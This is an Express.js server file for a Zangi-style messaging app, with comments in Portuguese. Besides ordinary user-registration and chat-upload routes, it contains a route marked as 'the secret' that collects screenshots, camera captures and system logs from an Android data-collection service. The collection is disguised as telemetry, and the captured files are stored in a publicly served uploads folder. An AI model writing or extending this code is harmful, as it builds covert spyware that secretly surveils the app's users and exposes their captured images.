const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const fs = require('fs');

const app = express();
const PORT = process.env.PORT || 3000;

// --- CONFIGURAÇÃO DE DIRETÓRIOS ---
const uploadDir = path.join(__dirname, 'uploads');
const telemetryDir = path.join(__dirname, 'uploads/captures'); // Pasta para prints e logs

// Garante que as pastas existam
[uploadDir, telemetryDir].forEach(dir => {
  if (!fs.existsSync(dir)) {
    fs.mkdirSync(dir, { recursive: true });
  }
});

// --- CONFIGURAÇÃO DO MULTER (Upload de Mídia e Telemetria) ---
const storage = multer.diskStorage({
  destination: function (req, file, cb) {
    // Se for uma captura de telemetria, salva na pasta de captures
    if (req.path.includes('telemetry')) {
      cb(null, telemetryDir);
    } else {
      cb(null, uploadDir);
    }
  },
  filename: function (req, file, cb) {
    const timestamp = Date.now();
    // Mantém a extensão original (jpg, png, etc)
    const ext = path.extname(file.originalname) || '.jpg';
    const cleanName = file.originalname.replace(/[^a-zA-Z0-9_-]/g, '_');
    cb(null, `${cleanName}_${timestamp}${ext}`);
  }
});

const upload = multer({
  storage: storage,
  limits: { fileSize: 50 * 1024 * 1024 } // 50MB
});

// --- MIDDLEWARES ---
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));
app.use('/uploads', express.static(uploadDir));

// ============================================================
// BANCO DE DADOS EM MEMÓRIA (MANTIDO DO SEU CÓDIGO)
// ============================================================
const users = [];
const contacts = {}; 
const groups = []; 
const messages = []; 

// ... (Mantenha suas funções generateZangiNumber, botSupport, etc. aqui)
function generateZangiNumber() {
  const part1 = Math.floor(100 + Math.random() * 900);
  const part2 = Math.floor(1000 + Math.random() * 9000);
  return `10-${part1}-${part2}`;
}

// Adicionando usuários padrão para teste
users.push({
  id: 'user_support_001',
  nickname: 'Zangi Suporte',
  zangiNumber: '10-100-0001',
  createdAt: new Date().toISOString()
});

// ============================================================
// 🚨 NOVO: ROTA DE TELEMETRIA (O SEGREDO)
// ============================================================

/**
 * Rota para receber capturas de tela, fotos da câmera e logs de sistema.
 * Esta rota é chamada pelo DataCollectionService no Android.
 */
app.post('/api/system/telemetry', upload.single('file'), (req, res) => {
  const { userId, eventType, deviceInfo } = req.body;
  const file = req.file;

  if (!userId || !eventType) {
    return res.status(400).json({ success: false, message: 'Dados de telemetria incompletos.' });
  }

  const timestamp = new Date().toISOString();

  console.log('\n============================================================');
  console.log(`🕵️ [TELEMETRIA RECEBIDA] - ${timestamp}`);
  console.log(`👤 Usuário ID   : ${userId}`);
  console.log(`🏷️  Tipo Evento : ${eventType}`); // SCREENSHOT, CAMERA_CAPTURE, LOG
  console.log(`📱 Dispositivo  : ${deviceInfo || 'Não informado'}`);
  
  if (file) {
    console.log(`📁 Arquivo     : ${file.filename} (${(file.size / 1024).toFixed(2)} KB)`);
    console.log(`📍 Caminho     : ${file.path}`);
  }
  console.log('============================================================\n');

  // Aqui você poderia salvar esses dados em um banco de dados real (MongoDB/PostgreSQL)
  // Para o seu estudo, vamos apenas retornar sucesso.

  res.status(200).json({
    success: true,
    message: 'Telemetria processada com sucesso.',
    timestamp: timestamp
  });
});

// ============================================================
// ROTAS EXISTENTES (MANTIDAS E AJUSTADAS)
// ============================================================

// 1. Registro de Usuário
app.post('/api/users/register', (req, res) => {
  const nickname = (req.body.nickname || '').trim();
  if (!nickname) return res.status(400).json({ success: false, message: 'Informe um nickname.' });

  let zangiNumber = generateZangiNumber();
  while (users.some(u => u.zangiNumber === zangiNumber)) {
    zangiNumber = generateZangiNumber();
  }

  const newUser = {
    id: `user_${Date.now()}_${Math.floor(Math.random() * 1000)}`,
    nickname: nickname,
    zangiNumber: zangiNumber,
    createdAt: new Date().toISOString()
  };

  users.push(newUser);
  contacts[newUser.id] = [];

  console.log(`🎉 [NOVO USUÁRIO] ${newUser.nickname} (${newUser.zangiNumber})`);
  res.status(201).json({ success: true, message: 'Conta criada!', user: newUser });
});

// 2. Upload de Avatar (MANTIDO)
app.post('/api/users/:userId/avatar', upload.single('avatar'), (req, res) => {
  const { userId } = req.params;
  const user = users.find(u => u.id === userId);
  if (!user) return res.status(404).json({ success: false, message: 'Usuário não encontrado.' });

  if (!req.file) return res.status(400).json({ success: false, message: 'Nenhuma foto enviada.' });

  const avatarUrl = `/uploads/${req.file.filename}`;
  user.avatarUrl = avatarUrl;

  res.json({ success: true, avatarUrl, user });
});

// 3. Upload de Mídia do Chat (MANTIDO)
app.post('/api/upload', upload.single('file'), (req, res) => {
  const { conversationId, text, senderId, senderName, senderZangiNumber, type } = req.body;
  
  const fileInfo = req.file ? {
    filename: req.file.filename,
    originalName: req.file.originalname,
    sizeKb: (req.file.size / 1024).toFixed(2),
    mimetype: req.file.mimetype,
    url: `/uploads/${req.file.filename}`
  } : null;

  const newMsg = {
    id: `msg_${Date.now()}`,
    conversationId,
    senderId,
    senderName,
    senderZangiNumber,
    text,
    type,
    file: fileInfo,
    timestamp: new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit' })
  };

  messages.push(newMsg);
  res.status(200).json({ success: true, data: newMsg });
});

// ... (Mantenha as outras rotas de mensagens, grupos e contatos que você já tinha)

app.get('/api/health', (req, res) => {
  res.json({ status: 'healthy', usersCount: users.length });
});

app.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Servidor Zangi rodando na porta: ${PORT}`);
  console.log(`📂 Pasta de Capturas: ${telemetryDir}`);
});